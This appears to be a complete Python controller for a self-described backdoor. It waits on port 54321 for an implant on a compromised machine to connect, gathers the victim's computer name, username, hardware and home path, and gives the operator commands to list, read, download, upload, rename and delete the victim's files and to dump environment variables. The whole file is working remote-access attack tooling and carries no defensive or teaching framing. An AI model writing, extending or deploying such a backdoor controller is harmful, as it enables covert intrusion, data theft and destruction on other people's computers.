import os
import socket
import time

def handle_error():
	print('\nError executing command. Try \'help\' to know exact command format.')

def show_files(ls):
	files = ls.split('\', \'')
	if len(files) > 1:
		file_first = files[0].split('[\'')[1]
		file_last = files[len(files) - 1].split('\']')[0]
		print(' -', file_first)
		for i in range(1, len(files) - 1):
			print(' -', files[i])
		print(' -', file_last)
	elif len(files) == 1:
		print(' -',files[0][2:-2])

def show_commands():
	print('\nCommands List')
	print('-------------')
	print('env\t- Environment\t\t-\tenv\n')
	print('cwd\t- Current Working Dir\t-\tcwd\n')
	print('ls\t- List\t\t\t-\tls\n')
	print('cd\t- Change Directory\t-\tcd [Target_Dir]\n')
	print('md\t- Make Directory\t-\tmd [New_Dir]\n')
	print('rd\t- Remove Directory\t-\trd [Dir]\n')
	print('rn\t- Rename Directory\t-\trn <[Source_Dir]> <[Dest_Dir]>\n')
	print('open\t- Open a file\t\t-\topen [File]\n')
	print('save\t- Download a file\t-\tsave [Source_File] [Dest_File]\n')
	print('del\t- Delete a file\t\t-\tdel [File]\n')
	print('send\t- Send a file\t\t-\tsend [File]\n')
	print('exit\t- Terminate Server\t-\texit\n')

def main():
	print('\nWELCOME TO THE BACKDOOR PROGRAM')
	print('-------------------------------')
	with socket.socket() as s:
		HOST = socket.gethostname()
		PORT = 54321
		s.bind(('', PORT))
		s.listen(1)
		print('\nWaiting for client to connect...', end = '\r')
		conn, addr = s.accept()
		print('Connected to client!            ')
		print('\nClient Details')
		print('--------------')
		print('\nClient IP address\t:\t', addr[0])
		time.sleep(0.125); conn.send('cmd'.encode())
		print('Computer Name\t\t:\t', conn.recv(1024).decode())
		time.sleep(0.125); conn.send('cmd'.encode())
		print('Username\t\t:\t', conn.recv(1024).decode())
		time.sleep(0.125); conn.send('cmd'.encode())
		print('Processor Architecture\t:\t', conn.recv(1024).decode())
		time.sleep(0.125); conn.send('cmd'.encode())
		print('Number of processors\t:\t', conn.recv(1024).decode())
		time.sleep(0.125); conn.send('cmd'.encode())
		print('Home Drive\t\t:\t', conn.recv(1024).decode())
		time.sleep(0.125); conn.send('cmd'.encode())
		print('Home Path\t\t:\t', conn.recv(1024).decode())
		time.sleep(0.125); conn.send('cmd'.encode())
		print('Terminal Size\t\t:\t', conn.recv(1024).decode())
		time.sleep(0.125); conn.send('cmd'.encode())
		print('\nCurrent Working Directory:\n', conn.recv(1024).decode())
		time.sleep(0.125); conn.send('cmd'.encode())
		print('\nFiles in Current Directory:')
		show_files(conn.recv(5000).decode())
	
		while 1:
			command = input('\nCommand >> ')
			cmd = command.split()[0]
			if cmd == 'help':
				show_commands()
			elif cmd == 'env':
				conn.send(cmd.encode())
				print()
				print(conn.recv(5000).decode())
			elif cmd == 'cwd':
				conn.send(cmd.encode())
				print('\nCurrent Working Directory:\n', conn.recv(1024).decode())
			elif cmd == 'ls':
				conn.send(cmd.encode())
				print('\nFiles in Current Directory:')
				show_files(conn.recv(5000).decode())
			elif cmd == 'cd':
				conn.send(command.encode())
				res = conn.recv(1024).decode()
				if res[:5] == 'Error':
					handle_error()
				else:
					print('\nCurrent Working Directory:\n', res)
			elif cmd == 'md':
				conn.send(command.encode())
				res = conn.recv(5000).decode()
				if res[:5] == 'Error':
					handle_error()
				else:
					print('\nFiles in Current Directory:')
					show_files(res)
			elif cmd == 'rd':
				conn.send(command.encode())
				res = conn.recv(5000).decode()
				if res[:5] == 'Error':
					handle_error()
				else:
					print('\nFiles in Current Directory:')
					show_files(res)
			elif cmd == 'rn':
				conn.send(command.encode())
				res = conn.recv(5000).decode()
				if res[:5] == 'Error':
					handle_error()
				else:
					print('\nFiles in Current Directory:')
					show_files(res)
			elif cmd == 'open':
				conn.send(command.encode())
				res = conn.recv(5000).decode()
				if res[:5] == 'Error':
					handle_error()
				else:
					print()
					print(res)
			elif cmd == 'save':
				conn.send(command.encode())
				data = conn.recv(5000)
				if data.decode()[:5] == 'Error':
					handle_error()
				else:
					filename = command.split()[2]
					file = open(filename, 'wb')
					file.write(data)
					file.close()
					print('\nFile downloaded.')
			elif cmd == 'del':
				conn.send(command.encode())
				res = conn.recv(5000).decode()
				if res[:5] == 'Error':
					handle_error()
				else:
					print('\nFiles in Current Directory:')
					show_files(res)
			elif cmd == 'send':
				conn.send(command.encode())
				filename = command.split()[1]
				file = open(filename, 'rb')
				data = file.read()
				conn.send(data)
				res = conn.recv(5000).decode()
				if res[:5] == 'Error':
					handle_error()
				else:
					print('\nFiles in Current Directory:')
					show_files(res)
			elif cmd == 'exit':
				print('\nTerminating Backdoor...')
				conn.send(cmd.encode())
				res = conn.recv(1024).decode()
				if res[:5] == 'Error':
					handle_error()
				else:
					break
			else:
				print('\nCommand not recognised.')

if __name__ == '__main__':
	main()